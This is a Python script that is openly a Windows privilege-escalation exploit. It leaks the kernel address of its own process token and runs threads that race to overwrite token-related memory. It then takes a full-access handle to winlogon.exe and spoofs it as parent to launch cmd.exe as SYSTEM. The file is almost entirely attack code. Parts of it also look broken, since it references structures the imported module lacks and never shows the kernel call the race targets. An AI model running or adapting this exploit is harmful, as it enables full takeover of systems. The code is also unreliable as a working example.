import ctypes
import ctypes.wintypes as wintypes
import threading
import time

TOKEN_ALL_ACCESS = 0xF01FF
PROCESS_ALL_ACCESS = 0x1F0FFF
THREAD_PRIORITY_TIME_CRITICAL = 15
SystemExtendedHandleInformation = 64
MEM_COMMIT = 0x1000
PAGE_READWRITE = 0x04
EXTENDED_STARTUPINFO_PRESENT = 0x00080000
CREATE_NEW_CONSOLE = 0x00000010

class SYSTEM_HANDLE(ctypes.Structure):
    _fields_ = [("Object", ctypes.c_void_p),
                ("UniqueProcessId", wintypes.HANDLE),
                ("HandleValue", wintypes.HANDLE),
                ("GrantedAccess", wintypes.ULONG),
                ("CreatorBackTraceIndex", wintypes.USHORT),
                ("ObjectTypeIndex", wintypes.USHORT),
                ("HandleAttributes", wintypes.ULONG),
                ("Reserved", wintypes.ULONG)]

class SYSTEM_HANDLE_INFORMATION_EX(ctypes.Structure):
    _fields_ = [("HandleCount", ctypes.c_ulonglong),
                ("Reserved", ctypes.c_ulonglong),
                ("Handles", SYSTEM_HANDLE * 1)]

class STARTUPINFOEXA(ctypes.Structure):
    _fields_ = [("StartupInfo", wintypes.STARTUPINFOA),
                ("lpAttributeList", ctypes.c_void_p)]

ntdll = ctypes.WinDLL("ntdll")
kernel32 = ctypes.WinDLL("kernel32")
advapi32 = ctypes.WinDLL("advapi32")

NtQuerySystemInformation = ntdll.NtQuerySystemInformation
NtQuerySystemInformation.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
NtQuerySystemInformation.restype = ctypes.c_ulong

OpenProcessToken = advapi32.OpenProcessToken
OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
OpenProcessToken.restype = wintypes.BOOL

GetCurrentProcess = kernel32.GetCurrentProcess
GetCurrentProcess.argtypes = []
GetCurrentProcess.restype = wintypes.HANDLE

VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
VirtualAlloc.restype = ctypes.c_void_p

CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot
CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]
CreateToolhelp32Snapshot.restype = wintypes.HANDLE

Process32First = kernel32.Process32FirstW
Process32First.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.PROCESSENTRY32W)]
Process32First.restype = wintypes.BOOL

Process32Next = kernel32.Process32NextW
Process32Next.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.PROCESSENTRY32W)]
Process32Next.restype = wintypes.BOOL

CreateProcessA = kernel32.CreateProcessA
CreateProcessA.argtypes = [wintypes.LPCSTR, wintypes.LPSTR, ctypes.c_void_p, ctypes.c_void_p, wintypes.BOOL, wintypes.DWORD, ctypes.c_void_p, wintypes.LPCSTR, ctypes.POINTER(wintypes.STARTUPINFOA), ctypes.POINTER(wintypes.PROCESS_INFORMATION)]
CreateProcessA.restype = wintypes.BOOL

InitializeProcThreadAttributeList = kernel32.InitializeProcThreadAttributeList
InitializeProcThreadAttributeList.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.c_ulong, ctypes.POINTER(ctypes.c_size_t)]
InitializeProcThreadAttributeList.restype = wintypes.BOOL

UpdateProcThreadAttribute = kernel32.UpdateProcThreadAttribute
UpdateProcThreadAttribute.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p]
UpdateProcThreadAttribute.restype = wintypes.BOOL

HeapAlloc = kernel32.HeapAlloc
HeapAlloc.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.c_size_t]
HeapAlloc.restype = ctypes.c_void_p

GetProcessHeap = kernel32.GetProcessHeap
GetProcessHeap.argtypes = []
GetProcessHeap.restype = wintypes.HANDLE

def GetKernelPointerByHandle(handle):
    len_info = 20
    status = 0xC0000004
    handle_info = None

    while status == 0xC0000004:
        len_info *= 2
        handle_info = ctypes.cast(ctypes.create_string_buffer(len_info), ctypes.POINTER(SYSTEM_HANDLE_INFORMATION_EX))
        status = NtQuerySystemInformation(SystemExtendedHandleInformation, handle_info, len_info, ctypes.byref(ctypes.c_ulong()))

    if status != 0x0:
        print("NtQuerySystemInformation failed with error code 0x{:X}".format(status))
        return None

    current_pid = kernel32.GetCurrentProcessId()
    for i in range(handle_info.contents.HandleCount):
        if handle_info.contents.Handles[i].UniqueProcessId == current_pid and handle_info.contents.Handles[i].HandleValue == handle:
            print("Found object!")
            return handle_info.contents.Handles[i].Object

    return None

def GetPidByName(procname):
    entry = wintypes.PROCESSENTRY32W()
    entry.dwSize = ctypes.sizeof(wintypes.PROCESSENTRY32W)

    snapshot = CreateToolhelp32Snapshot(0x00000002, 0)
    if snapshot == wintypes.INVALID_HANDLE_VALUE:
        return None

    if not Process32First(snapshot, ctypes.byref(entry)):
        kernel32.CloseHandle(snapshot)
        return None

    while Process32Next(snapshot, ctypes.byref(entry)):
        if entry.szExeFile == procname:
            kernel32.CloseHandle(snapshot)
            return entry.th32ProcessID

    kernel32.CloseHandle(snapshot)
    return None

def CreateProcessFromHandle(handle, command):
    si = STARTUPINFOEXA()
    pi = wintypes.PROCESS_INFORMATION()
    size = ctypes.c_size_t()

    InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
    si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, size.value)
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ctypes.byref(size))
    UpdateProcThreadAttribute(si.lpAttributeList, 0, 0x00020000, ctypes.byref(handle), ctypes.sizeof(handle), None, None)

    si.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEXA)

    ret = CreateProcessA(None, command, None, None, True, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, None, None, ctypes.byref(si.StartupInfo), ctypes.byref(pi))

    if not ret:
        print("Error creating new process ({})".format(kernel32.GetLastError()))
        return 3

    print("Enjoy your new SYSTEM process")
    return 0

def race_thread():
    global kTokenAddr, RaceAddr
    value = kTokenAddr + 0x40 - 4
    for _ in range(0x10000):
        ctypes.memmove(RaceAddr + 2, ctypes.c_ushort(2), 2)
        ctypes.memmove(RaceAddr + 8, ctypes.c_ulonglong(value), 8)

if __name__ == "__main__":
    hToken = wintypes.HANDLE()
    if not OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, ctypes.byref(hToken)):
        print("OpenProcessToken() failed.")
        exit(1)

    kTokenAddr = GetKernelPointerByHandle(hToken)
    if not kTokenAddr:
        print("GetKernelPointerByHandle() failed.")
        exit(1)

    print("hToken: {}, kTokenAddr: {}".format(hToken, kTokenAddr))

    TokenInfo = VirtualAlloc(None, 0x1000, MEM_COMMIT, PAGE_READWRITE)
    if not TokenInfo:
        print("VirtualAlloc() failed.")
        exit(1)

    RaceAddr = TokenInfo + 0x200

    thread1 = threading.Thread(target=race_thread)
    thread2 = threading.Thread(target=race_thread)

    thread1.start()
    thread2.start()

    time.sleep(1)

    pid = GetPidByName("winlogon.exe")
    if not pid:
        print("GetPidByName() failed.")
        exit(1)

    hWinLogon = wintypes.HANDLE()
    while not hWinLogon:
        hWinLogon = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

    print("Got Winlogon handle: {}".format(hWinLogon))

    CreateProcessFromHandle(hWinLogon, b"C:\\Windows\\system32\\cmd.exe")